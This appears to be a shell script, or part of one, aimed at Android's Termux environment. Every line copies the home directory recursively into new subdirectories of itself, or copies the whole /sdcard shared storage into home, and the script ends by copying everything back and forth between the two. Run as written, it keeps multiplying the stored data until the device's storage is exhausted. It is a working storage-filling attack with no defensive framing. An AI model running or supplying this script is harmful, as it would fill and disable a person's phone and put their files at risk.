cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm5
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm5
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm6 
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm6
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm7
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm7
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm8
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm8
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm9
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm9
cp -r $HOME $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm10
cp -r /sdcard $HOME/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm10

cd /sdcard

cp -r * $HOME

cd $HOME
cp -r * /sdcard


